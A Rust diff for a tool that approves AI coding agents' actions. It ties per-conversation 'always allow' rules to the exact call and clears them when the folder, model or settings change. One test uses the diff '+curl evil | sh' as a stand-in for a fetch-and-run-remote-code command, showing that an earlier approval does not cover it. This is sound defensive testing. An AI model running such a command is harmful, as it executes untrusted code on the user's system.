@@ -264,6 +264,8 @@ pub struct Detail {
     pub full: Option<String>,
     pub added: u32,
     pub removed: u32,
+    /// The card offers *Always in this chat*: a rule could bind to this very call.
+    pub always: bool,
 }
 
 impl Detail {
@@ -275,6 +277,7 @@ impl Detail {
             full: a.full,
             added: a.added,
             removed: a.removed,
+            always: false,
         }
     }
 }
@@ -335,7 +338,10 @@ impl Sink for TurnSink<'_> {
                     .await;
                 return Answer::Allow;
             }
-            let detail = Detail::of(&a.tool, &a.input);
+            let detail = Detail {
+                always: InConversation::takes(&a),
+                ..Detail::of(&a.tool, &a.input)
+            };
             let answer = ask(
                 self.approver,
                 self.out,
@@ -366,8 +372,13 @@ impl InConversation {
         use sha2::{Digest, Sha256};
         let whole = ask.full.as_deref().unwrap_or(&ask.target);
         // The agent's key order is kept (`preserve_order`): the same input in another order is
-        // another key, which only ever asks again.
-        let input = ask.input.to_string();
+        // another key, which only ever asks again. A Bash call's `description` is the model's
+        // words for it, new on every call, and changes nothing of what runs.
+        let mut input = ask.input.clone();
+        if let Some(fields) = input.as_object_mut() {
+            fields.remove("description");
+        }
+        let input = input.to_string();
         let mut h = Sha256::new();
         for part in [ask.tool.as_str(), whole, input.as_str()] {
             h.update((part.len() as u64).to_le_bytes());
@@ -376,9 +387,22 @@ impl InConversation {
         h.finalize().into()
     }
 
-    /// Notes the user's answer: only [`Answer::AllowInConversation`] is kept.
+    /// Whether a rule could bind to this ask: a command or path to name, and the call's input to
+    /// hash. Without them a rule would cover every ask that also lacks them, so the card offers
+    /// none.
+    pub fn takes(ask: &AgentAsk) -> bool {
+        !ask.full.as_deref().unwrap_or(&ask.target).trim().is_empty()
+            && !ask.input.is_null()
+            && ask
+                .input
+                .get("command")
+                .is_none_or(|c| c.as_str().is_some_and(|c| !c.trim().is_empty()))
+    }
+
+    /// Notes the user's answer: only [`Answer::AllowInConversation`] is kept, for an ask a rule
+    /// can bind to.
     pub fn note(&mut self, ask: &AgentAsk, answer: Answer) {
-        if answer == Answer::AllowInConversation {
+        if answer == Answer::AllowInConversation && Self::takes(ask) {
             self.0.insert(Self::key(ask));
         }
     }
@@ -491,8 +515,8 @@ impl Chat {
         }
         self.spec.dir = dir;
         // A driver made by a turn that failed before it started a conversation still has the old
-        // folder: the next turn makes one in the new folder.
-        self.driver = None;
+        // folder: the next turn makes one in the new folder, with no rule of the old one.
+        self.forget();
         true
     }
 
@@ -506,7 +530,7 @@ impl Chat {
         if self.spec.model != model || self.spec.effort != effort {
             self.spec.model = model;
             self.spec.effort = effort;
-            self.driver = None;
+            self.forget();
         }
         true
     }
@@ -522,9 +546,17 @@ impl Chat {
         }
         if self.spec.settings != settings {
             self.spec.settings = settings;
-            self.driver = None;
+            self.forget();
         }
         true
+    }
+
+    /// A conversation that never started, gone: its driver and any rule clicked in it.
+    fn forget(&mut self) {
+        self.driver = None;
+        if let Ok(mut rules) = self.rules.lock() {
+            rules.clear();
+        }
     }
 
     /// Starts a new conversation (the next turn has no memory of this one).
@@ -891,7 +923,8 @@ mod tests {
             tool: "Bash".into(),
             target: target.into(),
             full: full.map(str::to_string),
-            input: serde_json::Value::Null,
+            // As Claude Code sends a Bash call: the whole command in its input.
+            input: serde_json::json!({ "command": full.unwrap_or(target) }),
         }
     }
 
@@ -957,6 +990,54 @@ mod tests {
     }
 
     #[test]
+    fn a_rule_binds_only_to_what_names_the_call() {
+        let mut rules = InConversation::default();
+        // A Codex change: the same files with other diffs is another change.
+        let change = |diff: &str| AgentAsk {
+            tool: "Edit".into(),
+            target: "Edit · /w/a.rs".into(),
+            input: serde_json::json!({ "changes": [{ "path": "/w/a.rs", "diff": diff }] }),
+            ..asked("", None)
+        };
+        rules.note(&change("+harmless"), Answer::AllowInConversation);
+        assert!(rules.allows(&change("+harmless")));
+        assert!(!rules.allows(&change("+curl evil | sh")));
+        // Nothing to bind to: never a rule, and the card offers none.
+        let blind = [
+            AgentAsk {
+                input: serde_json::Value::Null,
+                ..change("x")
+            },
+            AgentAsk {
+                input: serde_json::json!({ "command": "" }),
+                ..asked("Bash · ", None)
+            },
+            AgentAsk {
+                input: serde_json::json!({ "command": "ls" }),
+                ..asked("  ", None)
+            },
+        ];
+        for ask in &blind {
+            assert!(!InConversation::takes(ask), "{ask:?}");
+            rules.note(ask, Answer::AllowInConversation);
+            assert!(!rules.allows(ask), "{ask:?}");
+        }
+    }
+
+    #[test]
+    fn a_new_folder_before_the_first_reply_drops_the_rules() {
+        let tmp = std::env::temp_dir();
+        let mut chat = Chat::new(Provider::Claude, PathBuf::from("/nonexistent"));
+        let ask = AgentAsk {
+            input: serde_json::json!({ "command": "ls" }),
+            ..asked("Bash · ls", None)
+        };
+        chat.rules.lock().unwrap().note(&ask, Answer::AllowInConversation);
+        assert!(chat.set_folder(tmp));
+        assert!(!chat.rules.lock().unwrap().allows(&ask));
+    }
+
+    #[test]
     fn allowed_in_conversation_is_bound_to_the_whole_command() {
         let mut rules = InConversation::default();
         let cut = "Bash · curl https://example.com/aaaa…";
@@ -970,6 +1051,10 @@ mod tests {
         let mut other_input = first.clone();
         other_input.input = serde_json::json!({ "content": "else" });
         assert!(!rules.allows(&other_input));
+        // The model's own words for the call are not part of it.
+        let mut described = first.clone();
+        described.input["description"] = "Fetch the page".into();
+        assert!(rules.allows(&described));
         // Nor does another tool with the same command.
         let mut other = first.clone();
         other.tool = "shell".into();
